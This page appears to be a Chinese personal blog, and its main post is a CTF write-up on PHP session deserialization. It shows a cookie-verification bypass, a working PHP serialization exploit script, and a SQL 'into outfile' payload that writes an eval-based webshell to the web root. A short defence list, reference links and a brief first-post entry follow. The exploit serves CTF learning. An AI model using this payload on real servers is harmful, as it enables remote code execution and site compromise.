<p>我们需要实现写入，那就要进入if语句的判断<code>if($data === NULL &amp;&amp; isset($_GET[&#39;token&#39;]))</code>，我们追踪<code>$data === NULL</code>，可以看到cookie_helper类</p>
<pre><code class="php">class cookie_helper&#123;
    private $secret = &quot;*************&quot;; //敏感信息打码

    public  function getCookie($name)&#123;
        return $this-&gt;verify($_COOKIE[$name]);

    &#125;

    public function setCookie($name,$value)&#123;
        $data = $value.&quot;|&quot;.md5($this-&gt;secret.$value);
        setcookie($name,$data);
    &#125;

    private function verify($cookie)&#123;
        $data = explode(&#39;|&#39;,$cookie);
        if (count($data) != 2) &#123;
            return null;
        &#125;
</code></pre>
<br>

<p>我们注册使用的name会被set_cookie返回一个cookie存储于浏览器，我们下次还想用注册的账号登录那么发包的时候就要带上这个cookie值。此时verify()方法中用“|”把cookie值隔开，判断数量是否为2，如果不为2返回null（关键点在这）<code>因此只需要我们注册时的name带上”|”，服务器给我们set_cookie时就可以生成带有“|”的cookie，带上这个cookie发包时就可以通过verify()检测返回data的值为null</code></p>
<br>

<p>后面连接数据库的操作关乎另一个sql的知识点在这不赘述</p>
<p>利用PDO::MYSQL_ATTR_INIT_COMMAND</p>
<pre><code>连接MySQL服务器时执行的命令（SQL语句）。将在重新连接时自动重新执行。注意，这个常量只能在构造一个新的数据库句柄时在driver_options数组中使用。
</code></pre>
<p>构造恶意命令<code>select &#39;&lt;?php eval($_POST[1]);phpinfo();?&gt;&#39; into outfile &#39;/var/www/html/1.php&#39;;</code></p>
<p>我们看向mysql_helper类，执行命令如下</p>
<pre><code class="php">public $option = array(
PDO::MYSQL_ATTR_INIT_COMMAND =&gt; “select &#39;&lt;?php eval($_POST[1]);phpinfo();?&gt;&#39; into outfile &#39;/var/www/html/1.php&#39;;”
);
</code></pre>
<p>再反推调用option的来自</p>
<pre><code class="php">    public function get_pdo()&#123;
        try&#123;
            $pdo = new PDO($this-&gt;db[&#39;dsn&#39;], $this-&gt;db[&#39;username&#39;], $this-&gt;db[&#39;password&#39;], $this-&gt;option);
        &#125;catch(PDOException $e)&#123;
            die(&#39;数据库连接失败:&#39; . $e-&gt;getMessage());
        &#125;
    
        return $pdo;
    &#125;
</code></pre>
<p>连接数据库就得执行mysql_helper::get_pdo()方法，然后必须执行application::log_last_user()方法</p>
<pre><code class="php">    private function log_last_user()&#123;
        $sql = &quot;select username,password from user order by id desc limit 1&quot;;
        $pdo = $this-&gt;mysql-&gt;get_pdo();
        $stmt = $pdo-&gt;prepare($sql);
        $stmt-&gt;execute();
        $ret = $stmt-&gt;fetch();
    &#125;
    public function __destruct()&#123;
       if($this-&gt;debug)&#123;
            $this-&gt;log_last_user();
       &#125;
    &#125;

&#125;
</code></pre>
<p>最后还要注意debug赋值为true才能进if连接数据库就得执行mysql_helper::get_pdo()方法，然后必须执行application::log_last_user()方法</p>
<br>

<p>最后贴上z3r4y师傅的exp如下</p>
<pre><code class="php">&lt;?php
session_start();
class mysql_helper
&#123;
    public $option = array(
        PDO::MYSQL_ATTR_INIT_COMMAND =&gt; &quot;select &#39;&lt;?php eval(\\$_POST[1]);phpinfo();?&gt;&#39;  into outfile &#39;/var/www/html/1.php&#39;;&quot;
    );
&#125;
class application
&#123;
    public $mysql;
    public $debug = true;
 
    public function __construct()
    &#123;
        $this-&gt;mysql = new mysql_helper();
    &#125;
&#125;
 
$a = new application();
echo urlencode(serialize($a));
</code></pre>
<p>反序列化的操作先到这里</p>
<br>

<p>具体操作就是先注册名称带有”|”账号，抓包得到服务器端响应的Set-Cookie，后续发包都要带上cookie，GET传参action&#x3D;wtf(不等于那三个值就行)&amp;token&#x3D;user|序列化字符串，将🐎传上去后就可以访问1.php得到flag</p>
<br>
<br>


<h2 id="常用的防御方法"><a href="#常用的防御方法" class="headerlink" title="常用的防御方法"></a>常用的防御方法</h2><ul>
<li><p>尽量避免出现混合使用不同session处理器的情况</p>
</li>
<li><p>严格控制数据输入</p>
</li>
</ul>
<br>
<br>


<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a><strong>参考文章</strong></h2><ul>
<li><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/iamstudy/articles/php_serialize_problem.html#2-php_session%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%97%AE%E9%A2%98">https://www.cnblogs.com/iamstudy/articles/php_serialize_problem.html#2-php_session序列化及反序列化问题</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/litlife/p/10748506.html">https://www.cnblogs.com/litlife/p/10748506.html</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6640?time__1311=n4+xnD0DRDBGitN4q05+bDyiWoi=ND90lBP3D&alichlgref=https://www.bing.com/#toc-1">https://xz.aliyun.com/t/6640?time__1311=n4%2BxnD0DRDBGitN4q05%2BbDyiWoi%3DND90lBP3D&amp;alichlgref=https%3A%2F%2Fwww.bing.com%2F#toc-1</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_73512445/article/details/134879829">https://blog.csdn.net/m0_73512445/article/details/134879829</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://z3r4y.blog.csdn.net/article/details/135333972?spm=1001.2014.3001.5502&ydreferer=aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3V1emVyYXk/dHlwZT1ibG9n">https://z3r4y.blog.csdn.net/article/details/135333972?spm=1001.2014.3001.5502&amp;ydreferer=aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3V1emVyYXk%2FdHlwZT1ibG9n</a></p>
</li>
</ul>

            
        </div>
    </div>
    <div class="post-tags">
        
        <span class="icon">
            <i class="fa-solid fa-tags fa-fw"></i>
        </span>
        
        
        
        <span class="tag">
            
            <a href="/tags/CTF-Web-Session/" style="color: #00bcd4">CTF-Web Session</a>
        </span>
        
    </div>
    <a href="/2024/05/09/PHP-Session-Unserialization/" class="go-post">阅读全文</a>
</div>

<div class="post">
    <a href="/2024/05/06/Myfirstblog/">
        <h2 class="post-title">My First Blog</h2>
    </a>
    <div class="category-and-date">
        
        <span class="category">
            <a href="/categories/%E4%B8%80%E4%BA%9B%E9%A3%8E%E8%A8%80%E9%A3%8E%E8%AF%AD/">
                <span class="icon">
                    <i class="fa-solid fa-bookmark fa-fw"></i>
                </span>
                一些风言风语
            </a>
        </span>
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2024/5/6
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <h2 id="0x01-搭这个blog的心酸历程"><a href="#0x01-搭这个blog的心酸历程" class="headerlink" title="0x01 搭这个blog的心酸历程"></a>0x01 搭这个blog的心酸历程</h2><p>之前帆神发过一个Gitee+Hexo+Fluid主题的blog搭建教程，按着教程来到最后的个性化和hexo d操作时卡住了，<br>加上gitee的申请审核给当时的我有点劝退了( 后来决定就用GitHub搭的可能更快一些，所以也按照教程来，发现当时的问题就在于没有安装<code>&lt;hexo-deployer-git模块&gt;</code></p>
<pre><code class="bash">$ npm install hexo-deployer-git --save
</code></pre>
<p>结果卡了差不多一个月的进度在一个晚上就推完了(你在干什么)</p>
<h2 id="0x02-写blog的初心"><a href="#0x02-写blog的初心" class="headerlink" title="0x02 写blog的初心"></a>0x02 写blog的初心</h2><p>希望自己不会忘记吧，文章的每一步操作可能会细致到键盘按键(),像我这种电脑小白总是在看文章的时候总是上一步还看得懂下一步就看不懂了，所以可能会有点啰嗦，我本身也不是什么大牛，没有什么水平，如果不嫌弃的话也来看看吧QwQ</p>

            
        </div>
    </div>
    <div class="post-tags">
        
        
        
    </div>
    <a href="/2024/05/06/Myfirstblog/" class="go-post">阅读全文</a>
</div>


        <div class="page-current">
    
    <span class="current">1</span>
    
    
    
    
</div>

    </div>
    
    <div id="home-card">
        <div id="card-style">
    <div id="card-div">
        <div class="avatar">
            <img src="/images/amiya.jpg" alt="avatar" />
        </div>
        <div class="name">Flu0r1n3</div>
        <div class="description">
            <p>人亦如星，或居高而渺然，或为彗而明夜。</p>

        </div>
        
        
        <div class="friend-links">
            
            <div class="friend-link">
                <a target="_blank" rel="noopener" href="https://wwwmarin.xyz">Marin</a>
            </div>
            
        </div>
        
    </div>
</div>

    </div>
    
</div>

            <footer id="footer">
    <div id="footer-wrap">
        <div>
            &copy;
            2022 - 2024 Flu0r1n3の妙妙屋
            <span id="footer-icon">
                <i class="fa-solid fa-font-awesome fa-fw"></i>
            </span>
            &commat;Flu0r1n3
        </div>
        <div>
            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
        </div>
        
    </div>
</footer>

        </div>
        
        <transition name="fade">
            <div id="preview" ref="preview" v-show="previewShow">
                <img id="preview-content" ref="previewContent" />
            </div>
        </transition>
        
    </div>
    <script src="/js/main.js"></script>
    
<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>
